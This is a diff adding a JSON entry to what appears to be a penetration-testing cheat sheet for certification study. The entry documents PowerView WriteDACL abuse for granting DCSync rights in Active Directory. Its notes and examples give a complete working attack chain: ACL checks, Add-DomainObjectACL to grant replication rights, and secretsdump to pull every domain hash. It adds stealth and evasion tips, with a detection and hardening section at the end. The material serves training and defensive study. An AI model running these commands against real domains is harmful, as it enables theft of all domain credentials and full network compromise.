@@ -1,0 +1,91 @@
+{
+  "id": "ad-domainobjectacl",
+  "name": "PowerView - Add DCSync Rights via WriteDACL",
+  "command": "$sid = Convert-NameToSid <user>\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}",
+  "description": "Two-step operation: first query the domain object ACL to confirm WriteDACL rights, then add DCSync rights (Replication-Get-Changes + Replication-Get-Changes-All) to a controlled user via Add-DomainObjectACL. The final step in most ACL escalation chains — grants ability to run secretsdump against the entire domain.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Privilege Escalation",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "acl-abuse",
+    "writedacl",
+    "dcsync",
+    "powerview",
+    "dacl",
+    "privilege-escalation"
+  ],
+  "mitre": [
+    "T1222.001",
+    "T1003.006"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY WRITEDACL IS THE CROWN JEWEL ===\nWriteDACL on the DOMAIN OBJECT means you can modify the domain's access control list.\nThe most dangerous abuse: grant yourself (or any account you control) DCSync rights.\n\nDCSync rights = 'Replicating Directory Changes' + 'Replicating Directory Changes All'\n(also known as DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)\nThese rights let you impersonate a Domain Controller and pull all NT hashes + Kerberos\nkeys from the domain — same as secretsdump without needing Domain Admin.\n\n=== FULL PROCEDURE ===\n# 1. Verify WriteDACL right exists for your controlled account (aclbuster)\n$sid = Convert-NameToSid wley\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid -and $_.ActiveDirectoryRights -like '*WriteDACL*'}\n\n# 2. Create credential for the account with WriteDACL right\n$Cred3 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\adunn', $SecPassword3)\n\n# 3. Grant DCSync rights to your working account (e.g., forend)\nAdd-DomainObjectACL -Credential $Cred3 -TargetIdentity 'DC=INLANEFREIGHT,DC=LOCAL' -PrincipalIdentity forend -Rights DCSync -Verbose\n\n# 4. Verify the rights were added\nGet-DomainObjectACL -ResolveGUIDs -Identity 'DC=inlanefreight,DC=local' | ? {$_.IdentityReferenceName -eq 'forend'}\n\n# 5. Run DCSync as forend (from Linux: secretsdump.py; from Windows: mimikatz lsadump::dcsync)\nsecretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/forend:password@172.16.5.5\n\n=== DCSync RIGHTS DETAILS ===\nRight 1: Replication-Get-Changes  (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\nRight 2: Replication-Get-Changes-All (GUID: 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2)\nBoth required. In PowerView: -Rights DCSync automatically adds both.\n\n=== DETECTION ===\nGiving non-DC accounts DCSync rights is highly anomalous.\nMicrosoft Defender for Identity detects this pattern.\nEvent 4662 on the domain object with access masks matching the GUIDs above.\nLog the action time + clean up after if trying to be stealthy (or just exfil fast).\n\n=== CLEANUP ===\nRemove-DomainObjectACL -Credential $Cred3 -TargetIdentity 'DC=INLANEFREIGHT,DC=LOCAL' -PrincipalIdentity forend -Rights DCSync -Verbose",
+  "examples": [
+    {
+      "label": "Find WriteDACL rights for a user",
+      "command": "$sid = Convert-NameToSid wley\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}"
+    },
+    {
+      "label": "Grant DCSync rights",
+      "command": "Add-DomainObjectACL -Credential $Cred3 -TargetIdentity 'DC=INLANEFREIGHT,DC=LOCAL' -PrincipalIdentity forend -Rights DCSync -Verbose"
+    },
+    {
+      "label": "Remove DCSync rights (cleanup)",
+      "command": "Remove-DomainObjectACL -Credential $Cred3 -TargetIdentity 'DC=INLANEFREIGHT,DC=LOCAL' -PrincipalIdentity forend -Rights DCSync -Verbose"
+    }
+  ],
+  "references": [
+    {
+      "title": "PowerView (PowerSploit)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "title": "An ACE Up the Sleeve",
+      "url": "https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-find-interesting-acl",
+      "rel": "prereq",
+      "note": "Identify the abusable right first."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Add-DomainObjectAcl abuses WriteDACL on the DOMAIN object to grant the attacker Replicating Directory Changes rights - self-granting DCSync.",
+    "prerequisites": "WriteDACL (or GenericAll) over the domain object.",
+    "impact": "Self-granted DCSync rights, enabling extraction of all domain hashes - domain compromise.",
+    "detection": "[MITRE T1222.001] Event 5136 (DACL modified on the domain object, adding the replication GUIDs) by a non-DA; followed by 4662 replication (DCSync).",
+    "artifacts": "A 5136 ACL change adding replication rights; the subsequent DCSync 4662.",
+    "prevention": "Tightly restrict WriteDACL on the domain object; alert on 5136 DACL changes there and on new replication grants; monitor 4662.",
+    "evasion": "Grant the right, DCSync quickly, then remove the ACE; all three actions are logged, so speed limits (not hides) exposure.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1222.001",
+      "MITRE T1003.006"
+    ],
+    "misconfiguration": "Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.",
+    "vulnerable_config": "# Example: a help-desk group has ForceChangePassword on Domain Admins members\n# Found via BloodHound 'ForceChangePassword' edge, or PowerView:\nGet-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |\n  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType\n\n# Another dangerous pattern — GenericWrite on a user (enables targeted Kerberoasting):\nGet-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}",
+    "secure_config": "# 1. Run AD ACL audit quarterly (automated):\n# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users\n# PowerView batch:\nGet-DomainObjectAcl -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |\n  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |\n  Export-Csv acl_review.csv\n\n# 2. Remove dangerous ACEs:\nRemove-DomainObjectAcl -TargetIdentity 'svc_sql' \\\n    -PrincipalIdentity 'helpdesk' -Rights GenericWrite\n\n# 3. Enable AD Protected Users group for privileged accounts\n# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius"
+  },
+  "tools": [
+    "PowerView"
+  ]
+}
